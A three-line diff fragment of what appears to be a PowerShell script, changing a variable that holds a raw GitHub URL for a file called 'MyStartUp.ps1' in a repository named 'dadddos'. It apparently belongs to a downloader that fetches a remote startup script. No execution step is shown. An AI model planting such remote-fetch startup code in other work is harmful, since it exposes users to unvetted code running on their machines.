@@ -1,4 +1,4 @@
-$downloadUrl = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"
+$downloadUrl = "https://raw.githubusercontent.com/fullcaletaxixth/dadddos/main/MyStartUp.ps1"
 $down = "https://raw.githubusercontent.com/fullcaletaxixtdos/dadddos/main/MyStartUp.ps1"
 
 
